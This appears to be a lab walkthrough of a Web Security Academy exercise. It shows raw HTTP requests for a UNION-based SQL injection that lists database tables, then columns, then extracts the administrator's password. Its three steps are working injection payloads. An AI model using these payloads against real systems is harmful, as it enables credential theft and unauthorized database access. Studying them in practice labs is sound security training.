pgSQL
##### Base request
GET /filter?category=Tech+gifts HTTP/2
Host: 0aa9006d03082897807b90fd00a100f6.web-security-academy.net
Cookie: session=0apMU3eIQFnQYAstesqgIjBLMgcoyyrq
Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aa9006d03082897807b90fd00a100f6.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


##### Step1: Identify DB used and look up all the tables
GET /filter?category=Tech+gifts _' UNION SELECT table_name,NULL FROM information_schema.tables--_ HTTP/2
Host: 0aa9006d03082897807b90fd00a100f6.web-security-academy.net
Cookie: session=0apMU3eIQFnQYAstesqgIjBLMgcoyyrq
Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aa9006d03082897807b90fd00a100f6.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

##### Step2: Identify relevant table with username and password, then look up the columns
GET /filter?category=Tech+gifts _' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_ucxsqs'--_ HTTP/2
Host: 0aa9006d03082897807b90fd00a100f6.web-security-academy.net
Cookie: session=0apMU3eIQFnQYAstesqgIjBLMgcoyyrq
Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aa9006d03082897807b90fd00a100f6.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

##### Step3: identify target user and print out password
GET /filter?category=Tech+gifts _' UNION SELECT username_wkdwqr,password_ikjyxx FROM users_ucxsqs WHERE username_wkdwqr='administrator'--_ HTTP/2
Host: 0aa9006d03082897807b90fd00a100f6.web-security-academy.net
Cookie: session=0apMU3eIQFnQYAstesqgIjBLMgcoyyrq
Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aa9006d03082897807b90fd00a100f6.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


